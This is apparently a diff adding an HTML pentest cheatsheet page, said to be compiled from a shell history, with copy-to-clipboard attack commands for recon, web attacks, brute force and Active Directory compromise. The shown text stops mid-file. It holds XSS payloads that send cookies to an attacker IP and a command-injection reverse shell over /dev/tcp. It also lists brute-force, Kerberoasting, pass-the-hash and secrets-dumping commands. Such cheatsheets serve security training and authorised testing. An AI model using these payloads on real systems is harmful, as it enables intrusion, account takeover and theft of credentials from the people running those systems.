@@ -1,0 +1,911 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<title>BurN1nGSPheRE — Pentest Cheatsheet</title>
+
+<!-- PWA -->
+<link rel="manifest" href="manifest.json">
+<meta name="theme-color" content="#00ffe0">
+<link rel="icon" href="icon-192.png">
+<link rel="apple-touch-icon" href="icon-192.png">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<meta name="apple-mobile-web-app-title" content="BurN1nG">
+<meta name="mobile-web-app-capable" content="yes">
+
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&family=Exo+2:wght@300;400;600&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #050a0f;
+    --bg2: #080e16;
+    --panel: #0b1520;
+    --panel2: #0e1c2e;
+    --accent: #00ffe0;
+    --accent2: #ff2d6b;
+    --accent3: #f7b731;
+    --accent4: #a855f7;
+    --text: #c8dff0;
+    --text-dim: #5a7a99;
+    --border: #1a3a5c;
+    --glow: 0 0 18px rgba(0,255,224,0.25);
+    --glow2: 0 0 18px rgba(255,45,107,0.25);
+  }
+
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  /* Fix for Google Sites embed — single scrollbar on #app-wrap */
+  html, body {
+    height: 100%;
+    overflow: hidden;
+  }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Exo 2', sans-serif;
+  }
+
+  /* Scrollable wrapper */
+  #app-wrap {
+    height: 100vh;
+    overflow-y: auto;
+    overflow-x: hidden;
+    position: relative;
+    scrollbar-width: thin;
+    scrollbar-color: var(--border) var(--bg);
+  }
+  #app-wrap::-webkit-scrollbar { width: 6px; }
+  #app-wrap::-webkit-scrollbar-track { background: var(--bg); }
+  #app-wrap::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+  #app-wrap::-webkit-scrollbar-thumb:hover { background: var(--accent); }
+
+  /* Animated grid bg */
+  #app-wrap::before {
+    content: '';
+    position: fixed; inset: 0;
+    background-image:
+      linear-gradient(rgba(0,255,224,0.03) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(0,255,224,0.03) 1px, transparent 1px);
+    background-size: 40px 40px;
+    pointer-events: none;
+    z-index: 0;
+  }
+
+  /* Scanline overlay */
+  #app-wrap::after {
+    content: '';
+    position: fixed; inset: 0;
+    background: repeating-linear-gradient(
+      0deg,
+      transparent,
+      transparent 2px,
+      rgba(0,0,0,0.15) 2px,
+      rgba(0,0,0,0.15) 4px
+    );
+    pointer-events: none;
+    z-index: 0;
+  }
+
+  header {
+    position: relative; z-index: 10;
+    padding: 2rem 2rem 1rem;
+    border-bottom: 1px solid var(--border);
+    background: linear-gradient(180deg, rgba(0,255,224,0.04) 0%, transparent 100%);
+  }
+
+  .header-top {
+    display: flex;
+    align-items: center;
+    gap: 1.5rem;
+    flex-wrap: wrap;
+  }
+
+  .logo-badge {
+    font-family: 'Orbitron', monospace;
+    font-weight: 900;
+    font-size: 1.05rem;
+    color: var(--bg);
+    background: var(--accent);
+    padding: 0.35rem 0.8rem;
+    clip-path: polygon(0 0, calc(100% - 8px) 0, 100% 100%, 8px 100%);
+    letter-spacing: 0.05em;
+    white-space: nowrap;
+  }
+
+  h1 {
+    font-family: 'Orbitron', monospace;
+    font-weight: 900;
+    font-size: clamp(1.4rem, 4vw, 2.2rem);
+    color: var(--accent);
+    text-shadow: 0 0 30px rgba(0,255,224,0.5);
+    letter-spacing: 0.08em;
+  }
+
+  .subtitle {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 0.78rem;
+    color: var(--text-dim);
+    margin-top: 0.4rem;
+    letter-spacing: 0.12em;
+  }
+
+  /* Search */
+  .search-bar {
+    position: relative; z-index: 10;
+    padding: 1rem 2rem;
+    background: var(--bg2);
+    border-bottom: 1px solid var(--border);
+  }
+
+  .search-bar input {
+    width: 100%;
+    max-width: 600px;
+    background: var(--panel);
+    border: 1px solid var(--border);
+    border-radius: 2px;
+    color: var(--accent);
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 0.9rem;
+    padding: 0.6rem 1rem;
+    outline: none;
+    transition: border-color 0.2s, box-shadow 0.2s;
+  }
+  .search-bar input:focus {
+    border-color: var(--accent);
+    box-shadow: var(--glow);
+  }
+  .search-bar input::placeholder { color: var(--text-dim); }
+
+  /* Nav tabs */
+  .nav-tabs {
+    position: relative; z-index: 10;
+    display: flex;
+    flex-wrap: wrap;
+    gap: 0.25rem;
+    padding: 0.75rem 2rem;
+    background: var(--bg2);
+    border-bottom: 1px solid var(--border);
+  }
+
+  .tab-btn {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 0.72rem;
+    padding: 0.35rem 0.9rem;
+    background: var(--panel);
+    border: 1px solid var(--border);
+    color: var(--text-dim);
+    cursor: pointer;
+    letter-spacing: 0.08em;
+    transition: all 0.18s;
+    clip-path: polygon(6px 0, 100% 0, calc(100% - 6px) 100%, 0 100%);
+  }
+  .tab-btn:hover, .tab-btn.active {
+    border-color: var(--accent);
+    color: var(--accent);
+    background: rgba(0,255,224,0.07);
+    box-shadow: var(--glow);
+  }
+  .tab-btn.active { font-weight: 700; }
+
+  /* Main layout */
+  main {
+    position: relative; z-index: 10;
+    padding: 1.5rem 2rem 4rem;
+    max-width: 1400px;
+    margin: 0 auto;
+  }
+
+  /* Section */
+  .section {
+    margin-bottom: 2.5rem;
+    animation: fadeIn 0.4s ease;
+  }
+  @keyframes fadeIn { from { opacity:0; transform:translateY(10px); } to { opacity:1; transform:none; } }
+
+  .section-title {
+    font-family: 'Orbitron', monospace;
+    font-size: 0.85rem;
+    font-weight: 700;
+    color: var(--accent3);
+    letter-spacing: 0.15em;
+    border-left: 3px solid var(--accent3);
+    padding-left: 0.75rem;
+    margin-bottom: 1rem;
+    text-transform: uppercase;
+  }
+
+  .cards-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(340px, 1fr));
+    gap: 1rem;
+  }
+
+  /* Card */
+  .card {
+    background: var(--panel);
+    border: 1px solid var(--border);
+    border-top: 2px solid var(--accent);
+    padding: 1rem 1.1rem;
+    position: relative;
+    transition: box-shadow 0.2s, border-color 0.2s;
+  }
+  .card:hover {
+    box-shadow: var(--glow);
+    border-color: var(--accent);
+  }
+  .card.red-top { border-top-color: var(--accent2); }
+  .card.red-top:hover { box-shadow: var(--glow2); }
+  .card.purple-top { border-top-color: var(--accent4); }
+  .card.yellow-top { border-top-color: var(--accent3); }
+
+  .card-title {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 0.78rem;
+    font-weight: 700;
+    color: var(--accent);
+    letter-spacing: 0.1em;
+    margin-bottom: 0.65rem;
+    display: flex;
+    align-items: center;
+    gap: 0.5rem;
+  }
+  .card.red-top .card-title { color: var(--accent2); }
+  .card.purple-top .card-title { color: var(--accent4); }
+  .card.yellow-top .card-title { color: var(--accent3); }
+
+  .card-title .icon { font-size: 0.9rem; }
+
+  /* Code block */
+  .cmd {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 0.76rem;
+    background: var(--bg);
+    border: 1px solid #112236;
+    border-left: 2px solid var(--border);
+    padding: 0.45rem 0.75rem;
+    color: #9fccee;
+    margin-bottom: 0.4rem;
+    line-height: 1.5;
+    word-break: break-all;
+    position: relative;
+    cursor: pointer;
+    transition: border-left-color 0.15s, color 0.15s;
+  }
+  .cmd:hover { border-left-color: var(--accent); color: var(--accent); }
+  .cmd .copied-badge {
+    position: absolute; right: 6px; top: 50%; transform: translateY(-50%);
+    font-size: 0.65rem; color: var(--accent); opacity: 0;
+    transition: opacity 0.2s;
+    pointer-events: none;
+  }
+  .cmd.copied .copied-badge { opacity: 1; }
+
+  /* Var highlight */
+  .cmd .var { color: var(--accent3); }
+  .cmd .flag { color: #7ec8e3; }
+  .cmd .str { color: #b5e88b; }
+  .cmd .comment { color: var(--text-dim); font-style: italic; }
+
+  .cmd-note {
+    font-size: 0.68rem;
+    color: var(--text-dim);
+    margin-bottom: 0.5rem;
+    padding-left: 0.3rem;
+    font-family: 'Exo 2', sans-serif;
+  }
+
+  .tag {
+    display: inline-block;
+    font-size: 0.6rem;
+    font-family: 'Share Tech Mono', monospace;
+    padding: 0.1rem 0.45rem;
+    border: 1px solid currentColor;
+    border-radius: 1px;
+    margin-right: 0.3rem;
+    margin-bottom: 0.5rem;
+    opacity: 0.7;
+  }
+  .tag.enum { color: #7ec8e3; }
+  .tag.exploit { color: var(--accent2); }
+  .tag.privesc { color: var(--accent4); }
+  .tag.persist { color: var(--accent3); }
+  .tag.web { color: #b5e88b; }
+  .tag.ad { color: #f0a0ff; }
+  .tag.pivot { color: var(--accent); }
+
+  /* Footer */
+  footer {
+    position: relative; z-index: 10;
+    text-align: center;
+    padding: 1rem;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 0.68rem;
+    color: var(--text-dim);
+    border-top: 1px solid var(--border);
+  }
+
+  .hidden { display: none !important; }
+
+  /* Glitch animation on title */
+  @keyframes glitch {
+    0%, 100% { text-shadow: 0 0 30px rgba(0,255,224,0.5); }
+    33% { text-shadow: -2px 0 var(--accent2), 0 0 30px rgba(0,255,224,0.5); }
+    66% { text-shadow: 2px 0 var(--accent4), 0 0 30px rgba(0,255,224,0.5); }
+  }
+  h1 { animation: glitch 4s ease-in-out infinite; }
+
+  .counter {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 0.7rem;
+    color: var(--text-dim);
+    padding: 0.5rem 2rem 0;
+    position: relative; z-index: 10;
+  }
+</style>
+</head>
+<body>
+<div id="app-wrap">
+
+<header>
+  <div class="header-top">
+    <div class="logo-badge">YARMTUK</div>
+    <div>
+      <h1>BurN1nGSPheRE</h1>
+      <div class="subtitle">// PENTEST COMMAND CHEATSHEET — COMPILED FROM .ZSH_HISTORY //</div>
+    </div>
+  </div>
+</header>
+
+<div class="search-bar">
+  <input type="text" id="searchInput" placeholder="[ SEARCH COMMAND... ]" oninput="filterAll()">
+</div>
+
+<div class="nav-tabs">
+  <button class="tab-btn active" onclick="filterTab('all')">ALL</button>
+  <button class="tab-btn" onclick="filterTab('recon')">RECON/ENUM</button>
+  <button class="tab-btn" onclick="filterTab('web')">WEB</button>
+  <button class="tab-btn" onclick="filterTab('brute')">BRUTE FORCE</button>
+  <button class="tab-btn" onclick="filterTab('ad')">ACTIVE DIRECTORY</button>
+  <button class="tab-btn" onclick="filterTab('shell')">SHELL/PAYLOAD</button>
+  <button class="tab-btn" onclick="filterTab('privesc')">PRIVESC</button>
+  <button class="tab-btn" onclick="filterTab('persist')">PERSISTENCE</button>
+  <button class="tab-btn" onclick="filterTab('pivot')">PIVOT/TUNNEL</button>
+  <button class="tab-btn" onclick="filterTab('transfer')">FILE TRANSFER</button>
+  <button class="tab-btn" onclick="filterTab('log')">LOG ANALYSIS</button>
+  <button class="tab-btn" onclick="filterTab('tool')">TOOLS SETUP</button>
+</div>
+
+<div class="counter" id="counter"></div>
+
+<main id="mainContent">
+
+<!-- ═══════════════ RECON / ENUM ═══════════════ -->
+<div class="section" data-cat="recon">
+  <div class="section-title">🔍 RECON & ENUMERATION</div>
+  <div class="cards-grid">
+
+    <div class="card">
+      <div class="card-title"><span class="icon">📡</span> NMAP</div>
+      <span class="tag enum">ENUM</span>
+      <div class="cmd" onclick="copyCmd(this)">nmap -Pn -A -vv -T5 -p- <span class="var">{{IP}}</span> -oX nmap.xml<span class="copied-badge">✓ copied</span></div>
+      <div class="cmd-note">Full scan + aggressive + save XML</div>
+      <div class="cmd" onclick="copyCmd(this)">nmap -p- --open -sS --min-rate 5000 -n -Pn <span class="var">{{IP}}</span> -vvv<span class="copied-badge">✓ copied</span></div>
+      <div class="cmd-note">Fast SYN scan ทุก port</div>
+      <div class="cmd" onclick="copyCmd(this)">nmap -Pn -sU -T5 <span class="var">{{IP}}</span><span class="copied-badge">✓ copied</span></div>
+      <div class="cmd-note">UDP scan</div>
+      <div class="cmd" onclick="copyCmd(this)">nmap -Pn -T5 <span class="var">{{IP}}</span> -p 80 --script http-*<span class="copied-badge">✓ copied</span></div>
+    </div>
+
+    <div class="card">
+      <div class="card-title"><span class="icon">🪟</span> SMB ENUM</div>
+      <span class="tag enum">ENUM</span>
+      <div class="cmd" onclick="copyCmd(this)">enum4linux <span class="var">{{IP}}</span> -a -v<span class="copied-badge">✓ copied</span></div>
+      <div class="cmd" onclick="copyCmd(this)">enum4linux-ng <span class="var">{{IP}}</span><span class="copied-badge">✓ copied</span></div>
+      <div class="cmd" onclick="copyCmd(this)">smbmap -H <span class="var">{{IP}}</span> -r<span class="copied-badge">✓ copied</span></div>
+      <div class="cmd" onclick="copyCmd(this)">smbmap -H <span class="var">{{IP}}</span> -u <span class="var">{{USER}}</span> -p <span class="var">{{PASS}}</span> -r<span class="copied-badge">✓ copied</span></div>
+      <div class="cmd" onclick="copyCmd(this)">smbclient -L //<span class="var">{{IP}}</span> -U <span class="var">{{USER}}</span><span class="copied-badge">✓ copied</span></div>
+      <div class="cmd" onclick="copyCmd(this)">smbclient //<span class="var">{{IP}}</span>/<span class="var">{{SHARE}}</span> -U <span class="var">{{USER}}</span><span class="copied-badge">✓ copied</span></div>
+    </div>
+
+    <div class="card">
+      <div class="card-title"><span class="icon">🌐</span> DNS ENUM</div>
+      <span class="tag enum">ENUM</span>
+      <div class="cmd" onclick="copyCmd(this)">dig @<span class="var">{{IP}}</span> <span class="var">{{DOMAIN}}</span> A<span class="copied-badge">✓ copied</span></div>
+      <div class="cmd" onclick="copyCmd(this)">dnsenum --dnsserver <span class="var">{{IP}}</span> --enum -v -w -r<span class="copied-badge">✓ copied</span></div>
+      <div class="cmd" onclick="copyCmd(this)">dnsmap <span class="var">{{IP}}</span><span class="copied-badge">✓ copied</span></div>
+      <div class="cmd" onclick="copyCmd(this)">whois <span class="var">{{DOMAIN}}</span><span class="copied-badge">✓ copied</span></div>
+    </div>
+
+    <div class="card">
+      <div class="card-title"><span class="icon">📦</span> SNMP ENUM</div>
+      <span class="tag enum">ENUM</span>
+      <div class="cmd" onclick="copyCmd(this)">snmpwalk -v2c -c public <span class="var">{{IP}}</span> NET-SNMP-EXTEND-MIB::nsExtendObjects<span class="copied-badge">✓ copied</span></div>
+      <div class="cmd" onclick="copyCmd(this)">snmpwalk -v2c -c <span class="var">{{COMMUNITY}}</span> <span class="var">{{IP}}</span> NET-SNMP-EXTEND-MIB::nsExtendOutputFull<span class="copied-badge">✓ copied</span></div>
+    </div>
+
+    <div class="card">
+      <div class="card-title"><span class="icon">👤</span> USER ENUM (AD)</div>
+      <span class="tag enum">ENUM</span><span class="tag ad">AD</span>
+      <div class="cmd" onclick="copyCmd(this)">kerbrute userenum --dc <span class="var">{{IP}}</span> -d <span class="var">{{DOMAIN}}</span> /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt<span class="copied-badge">✓ copied</span></div>
+      <div class="cmd" onclick="copyCmd(this)">./username-anarchy --input-file users.txt --select-format first,firstlast,first.last,firstlast[8],firstl,f.last,flast > anarchy_users.txt<span class="copied-badge">✓ copied</span></div>
+    </div>
+
+    <div class="card">
+      <div class="card-title"><span class="icon">🔗</span> NXC / CME ENUM</div>
+      <span class="tag enum">ENUM</span><span class="tag ad">AD</span>
+      <div class="cmd" onclick="copyCmd(this)">nxc smb <span class="var">{{IP}}</span> -u <span class="var">{{USER}}</span> -p <span class="var">'{{PASS}}'</span> --shares<span class="copied-badge">✓ copied</span></div>
+      <div class="cmd" onclick="copyCmd(this)">nxc ldap <span class="var">{{IP}}</span> -u <span class="var">{{USER}}</span> -p <span class="var">'{{PASS}}'</span> --users<span class="copied-badge">✓ copied</span></div>
+      <div class="cmd" onclick="copyCmd(this)">nxc smb <span class="var">{{IP}}</span> -u '' -p ''<span class="copied-badge">✓ copied</span></div>
+      <div class="cmd-note">Null session test</div>
+      <div class="cmd" onclick="copyCmd(this)">nxc rdp <span class="var">{{SUBNET}}</span> -u <span class="var">{{USER}}</span> -p <span class="var">'{{PASS}}'</span><span class="copied-badge">✓ copied</span></div>
+      <div class="cmd" onclick="copyCmd(this)">nxc smb <span class="var">{{IP}}</span> -u <span class="var">{{USER}}</span> -p <span class="var">{{PASS}}</span> --local-auth<span class="copied-badge">✓ copied</span></div>
+    </div>
+
+  </div>
+</div>
+
+<!-- ═══════════════ WEB ═══════════════ -->
+<div class="section" data-cat="web">
+  <div class="section-title">🕸 WEB ATTACKS</div>
+  <div class="cards-grid">
+
+    <div class="card red-top">
+      <div class="card-title"><span class="icon">📂</span> DIR BUSTING</div>
+      <span class="tag web">WEB</span>
+      <div class="cmd" onclick="copyCmd(this)">gobuster dir -u http://<span class="var">{{IP}}</span> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,html,txt<span class="copied-badge">✓ copied</span></div>
+      <div class="cmd" onclick="copyCmd(this)">dirsearch -u http://<span class="var">{{IP}}</span><span class="copied-badge">✓ copied</span></div>
+      <div class="cmd" onclick="copyCmd(this)">ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<span class="var">{{DOMAIN}}</span> -fs 0<span class="copied-badge">✓ copied</span></div>
+      <div class="cmd" onclick="copyCmd(this)">ffuf -w /usr/share/wordlists/dirb/common.txt -u http://FUZZ.<span class="var">{{DOMAIN}}</span> -fs 0<span class="copied-badge">✓ copied</span></div>
+      <div class="cmd-note">Vhost / subdomain fuzzing</div>
+    </div>
+
+    <div class="card red-top">
+      <div class="card-title"><span class="icon">💉</span> XSS</div>
+      <span class="tag web">WEB</span><span class="tag exploit">EXPLOIT</span>
+      <div class="cmd" onclick="copyCmd(this)">&gt;&quot;&lt;img src=/ onerror=window.location=<span class="str">'http://{{KALI_IP}}?'</span>+document.cookie;&gt;<span class="copied-badge">✓ copied</span></div>
+      <div class="cmd-note">Blind XSS steal cookie</div>
+      <div class="cmd" onclick="copyCmd(this)">&lt;script src=<span class="str">"http://{{KALI_IP}}:8000/script.js"</span>&gt;&lt;/script&gt;<span class="copied-badge">✓ copied</span></div>
+      <div class="cmd-note">Load external JS (CSRF/cookie steal)</div>
+    </div>
+
+    <div class="card red-top">
+      <div class="card-title"><span class="icon">🧨</span> COMMAND INJECTION</div>
+      <span class="tag web">WEB</span><span class="tag exploit">EXPLOIT</span>
+      <div class="cmd" onclick="copyCmd(this)">;setsid /bin/bash -c "/bin/bash -i &gt;&amp; /dev/tcp/<span class="var">{{KALI_IP}}</span>/<span class="var">{{PORT}}</span> 0&gt;&amp;1";<span class="copied-badge">✓ copied</span></div>
+      <div class="cmd-note">JSON param cmd injection reverseshell</div>
+    </div>
+
+    <div class="card red-top">
+      <div class="card-title"><span class="icon">🔍</span> SCANNING / VULN</div>
+      <span class="tag web">WEB</span>
+      <div class="cmd" onclick="copyCmd(this)">nikto -h http://<span class="var">{{IP}}</span><span class="copied-badge">✓ copied</span></div>
+      <div class="cmd" onclick="copyCmd(this)">nuclei -u http://<span class="var">{{IP}}</span>:<span class="var">{{PORT}}</span> -t cves/<span class="copied-badge">✓ copied</span></div>
+      <div class="cmd" onclick="copyCmd(this)">sqlmap -u <span class="str">"http://{{IP}}/page?id=1"</span> --dbs<span class="copied-badge">✓ copied</span></div>
+      <div class="cmd" onclick="copyCmd(this)">davtest -url http://<span class="var">{{IP}}</span><span class="copied-badge">✓ copied</span></div>
+      <div class="cmd" onclick="copyCmd(this)">searchsploit <span class="var">{{SOFTWARE}}</span> <span class="var">{{VERSION}}</span><span class="copied-badge">✓ copied</span></div>
+    </div>
+
+    <div class="card red-top">
+      <div class="card-title"><span class="icon">🍕</span> MISC WEB</div>
+      <span class="tag web">WEB</span>
+      <div class="cmd" onclick="copyCmd(this)">curl -X GET http://<span class="var">{{IP}}</span>:<span class="var">{{PORT}}</span>/admin -H <span class="str">"Content-Type: application/json"</span> -d <span class="str">'{"auth":{"name":"admin","password":"p@ssw0rd"}}'</span><span class="copied-badge">✓ copied</span></div>
+      <div class="cmd" onclick="copyCmd(this)">curl http://<span class="var">{{IP}}</span>/robots.txt<span class="copied-badge">✓ copied</span></div>
+      <div class="cmd" onclick="copyCmd(this)">nc <span class="var">{{IP}}</span> <span class="var">{{PORT}}</span><span class="copied-badge">✓ copied</span></div>
+    </div>
+
+    <div class="card red-top">
+      <div class="card-title"><span class="icon">🐘</span> PHP ONELINERS</div>
+      <span class="tag web">WEB</span><span class="tag exploit">EXPLOIT</span>
+      <div class="cmd" onclick="copyCmd(this)">php -r '$c=mysqli_connect("db","user","test","dockerExample");$r=mysqli_query($c,"select * from Flag_is_my_secret");while($row=mysqli_fetch_assoc($r)){print_r($row);}'<span class="copied-badge">✓ copied</span></div>
+    </div>
+
+  </div>
+</div>
+
+<!-- ═══════════════ BRUTE FORCE ═══════════════ -->
+<div class="section" data-cat="brute">
+  <div class="section-title">🔓 BRUTE FORCE</div>
+  <div class="cards-grid">
+
+    <div class="card yellow-top">
+      <div class="card-title"><span class="icon">💧</span> HYDRA — HTTP POST</div>
+      <span class="tag enum">BRUTE</span>
+      <div class="cmd" onclick="copyCmd(this)">hydra -vV -l <span class="var">{{USER}}</span> -P <span class="var">{{WORDLIST}}</span> <span class="var">{{IP}}</span> http-post-form <span class="str">"/login.php:email=^USER^&password=^PASS^&submit=:S=/dashboard.php"</span><span class="copied-badge">✓ copied</span></div>
+      <div class="cmd-note">S= คือ success string, F= คือ failure string</div>
+      <div class="cmd" onclick="copyCmd(this)">hydra -vV -l <span class="var">{{USER}}</span> -P <span class="var">{{WORDLIST}}</span> <span class="var">{{IP}}</span> http-post-form <span class="str">"/pin.php:pin=^PASS^:S=panel.php:C=PHPSESSID={{SESSION}}"</span><span class="copied-badge">✓ copied</span></div>
+      <div class="cmd-note">พร้อม cookie session</div>
+    </div>
+
+    <div class="card yellow-top">
+      <div class="card-title"><span class="icon">🔑</span> CRACKMAPEXEC / NXC</div>
+      <span class="tag enum">BRUTE</span><span class="tag ad">AD</span>
+      <div class="cmd" onclick="copyCmd(this)">crackmapexec smb <span class="var">{{IP}}</span> -u user.txt -p /usr/share/wordlists/metasploit/unix_passwords.txt --continue-on-success<span class="copied-badge">✓ copied</span></div>
+      <div class="cmd" onclick="copyCmd(this)">crackmapexec winrm <span class="var">{{IP}}</span> -u user.txt -p pass.txt -d <span class="var">{{DOMAIN}}</span> --continue-on-success<span class="copied-badge">✓ copied</span></div>
+      <div class="cmd" onclick="copyCmd(this)">nxc rdp <span class="var">{{IP}}</span> -u <span class="var">{{USER}}</span> -p /usr/share/wordlists/rockyou.txt<span class="copied-badge">✓ copied</span></div>
+    </div>
+
+    <div class="card yellow-top">
+      <div class="card-title"><span class="icon">📖</span> JOHN / HASHCAT</div>
+      <span class="tag enum">CRACK</span>
+      <div class="cmd" onclick="copyCmd(this)">john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt<span class="copied-badge">✓ copied</span></div>
+      <div class="cmd" onclick="copyCmd(this)">john --format=bcrypt hash.txt --wordlist=/usr/share/wordlists/rockyou.txt<span class="copied-badge">✓ copied</span></div>
+      <div class="cmd" onclick="copyCmd(this)">openssl passwd -1 <span class="var">'{{PASSWORD}}'</span><span class="copied-badge">✓ copied</span></div>
+      <div class="cmd-note">Generate MD5 crypt hash</div>
+    </div>
+
+    <div class="card yellow-top">
+      <div class="card-title"><span class="icon">🗝</span> KEEPASS BRUTE</div>
+      <span class="tag enum">BRUTE</span>
+      <div class="cmd" onclick="copyCmd(this)">./keepass4brute.sh /home/kali/recovery.kdbx /usr/share/wordlists/rockyou.txt<span class="copied-badge">✓ copied</span></div>
+      <div class="cmd" onclick="copyCmd(this)">keepassxc recovery.kdbx<span class="copied-badge">✓ copied</span></div>
+    </div>
+
+  </div>
+</div>
+
+<!-- ═══════════════ ACTIVE DIRECTORY ═══════════════ -->
+<div class="section" data-cat="ad">
+  <div class="section-title">🏰 ACTIVE DIRECTORY</div>
+  <div class="cards-grid">
+
+    <div class="card purple-top">
+      <div class="card-title"><span class="icon">🎫</span> KERBEROS / TGT</div>
+      <span class="tag ad">AD</span>
+      <div class="cmd" onclick="copyCmd(this)">impacket-getTGT <span class="var">{{DOMAIN}}</span>/'<span class="var">{{USER}}</span>':'<span class="var">{{PASS}}</span>' -dc-ip <span class="var">{{IP}}</span><span class="copied-badge">✓ copied</span></div>
+      <div class="cmd" onclick="copyCmd(this)">export KRB5CCNAME="$PWD/<span class="var">{{USER}}</span>.ccache"<span class="copied-badge">✓ copied</span></div>
+      <div class="cmd" onclick="copyCmd(this)">impacket-GetNPUsers <span class="var">{{DOMAIN}}</span>/ -no-pass -usersfile users.txt -dc-ip <span class="var">{{IP}}</span> -format john<span class="copied-badge">✓ copied</span></div>
+      <div class="cmd-note">AS-REP Roasting</div>
+      <div class="cmd" onclick="copyCmd(this)">impacket-GetUserSPNs -dc-host <span class="var">{{DC}}</span> -k -no-pass <span class="var">{{DOMAIN}}</span>/<span class="var">{{USER}}</span> -request<span class="copied-badge">✓ copied</span></div>
+      <div class="cmd-note">Kerberoasting</div>
+      <div class="cmd" onclick="copyCmd(this)">python3 targetedKerberoast.py -k --dc-host <span class="var">{{DC}}</span> -u <span class="var">{{USER}}</span> -d <span class="var">{{DOMAIN}}</span><span class="copied-badge">✓ copied</span></div>
+      <div class="cmd" onclick="copyCmd(this)">nxc smb <span class="var">{{DC}}</span> -u <span class="var">{{USER}}</span> -M timeroast -k<span class="copied-badge">✓ copied</span></div>
+    </div>
+
+    <div class="card purple-top">
+      <div class="card-title"><span class="icon">🩸</span> BLOODHOUND</div>
+      <span class="tag ad">AD</span>
+      <div class="cmd" onclick="copyCmd(this)">bloodhound-python -d <span class="var">{{DOMAIN}}</span> -u <span class="var">{{USER}}</span> -p <span class="var">'{{PASS}}'</span> -ns <span class="var">{{IP}}</span> -c all<span class="copied-badge">✓ copied</span></div>
+      <div class="cmd" onclick="copyCmd(this)">bloodhound-python -d <span class="var">{{DOMAIN}}</span> -u <span class="var">{{USER}}</span> -ns <span class="var">{{IP}}</span> -c all -k -no-pass<span class="copied-badge">✓ copied</span></div>
+    </div>
+
+    <div class="card purple-top">
+      <div class="card-title"><span class="icon">⚡</span> LATERAL MOVEMENT</div>
+      <span class="tag ad">AD</span><span class="tag exploit">EXPLOIT</span>
+      <div class="cmd" onclick="copyCmd(this)">evil-winrm -i <span class="var">{{IP}}</span> -u <span class="var">{{USER}}</span> -p <span class="var">{{PASS}}</span><span class="copied-badge">✓ copied</span></div>
+      <div class="cmd" onclick="copyCmd(this)">evil-winrm -i <span class="var">{{IP}}</span> -u Administrator -H <span class="var">{{NTLM_HASH}}</span><span class="copied-badge">✓ copied</span></div>
+      <div class="cmd" onclick="copyCmd(this)">evil-winrm -i <span class="var">{{DC}}</span> -k -u <span class="var">{{USER}}</span> -r <span class="var">{{DOMAIN}}</span><span class="copied-badge">✓ copied</span></div>
+      <div class="cmd" onclick="copyCmd(this)">impacket-psexec -k -no-pass '<span class="var">{{DOMAIN}}</span>/<span class="var">{{USER}}</span>@<span class="var">{{DC}}</span>'<span class="copied-badge">✓ copied</span></div>
+      <div class="cmd" onclick="copyCmd(this)">impacket-wmiexec -k -no-pass <span class="var">{{DOMAIN}}</span>/<span class="var">{{USER}}</span>@<span class="var">{{DC}}</span><span class="copied-badge">✓ copied</span></div>
+    </div>
+
+    <div class="card purple-top">
+      <div class="card-title"><span class="icon">🗡</span> DUMP SECRETS</div>
+      <span class="tag ad">AD</span>
+      <div class="cmd" onclick="copyCmd(this)">impacket-secretsdump -k -no-pass <span class="var">{{DOMAIN}}</span>/<span class="var">{{USER}}</span>@<span class="var">{{DC}}</span><span class="copied-badge">✓ copied</span></div>
+      <div class="cmd" onclick="copyCmd(this)">impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL<span class="copied-badge">✓ copied</span></div>
+      <div class="cmd" onclick="copyCmd(this)">nxc smb <span class="var">{{DC}}</span> -d <span class="var">{{DOMAIN}}</span> --use-kcache --sam<span class="copied-badge">✓ copied</span></div>
+      <div class="cmd" onclick="copyCmd(this)">nxc smb <span class="var">{{DC}}</span> -d <span class="var">{{DOMAIN}}</span> --use-kcache --lsa<span class="copied-badge">✓ copied</span></div>
+      <div class="cmd" onclick="copyCmd(this)">nxc ldap <span class="var">{{DC}}</span> -d <span class="var">{{DOMAIN}}</span> --use-kcache --gmsa<span class="copied-badge">✓ copied</span></div>
+    </div>
+
+    <div class="card purple-top">
+      <div class="card-title"><span class="icon">📜</span> ADCS / CERTIPY</div>
+      <span class="tag ad">AD</span>
+      <div class="cmd" onclick="copyCmd(this)">certipy-ad find -k -no-pass -u <span class="var">{{USER}}</span>@<span class="var">{{DOMAIN}}</span> -target <span class="var">{{DC}}</span> -dc-ip <span class="var">{{IP}}</span> -vulnerable<span class="copied-badge">✓ copied</span></div>
+      <div class="cmd" onclick="copyCmd(this)">certipy-ad auth -pfx administrator.pfx -ldap-shell -dc-ip <span class="var">{{IP}}</span><span class="copied-badge">✓ copied</span></div>
+    </div>
+
+    <div class="card purple-top">
+      <div class="card-title"><span class="icon">👑</span> DPAPI / MISC AD</div>
+      <span class="tag ad">AD</span>
+      <div class="cmd" onclick="copyCmd(this)">impacket-dpapi masterkey -file <span class="var">{{MASTERKEY_GUID}}</span> -sid <span class="var">{{SID}}</span> -password '<span class="var">{{PASS}}</span>'<span class="copied-badge">✓ copied</span></div>
+      <div class="cmd" onclick="copyCmd(this)">impacket-dpapi credential -file <span class="var">{{CREDFILE}}</span> -key <span class="var">{{MASTERKEY_HEX}}</span><span class="copied-badge">✓ copied</span></div>
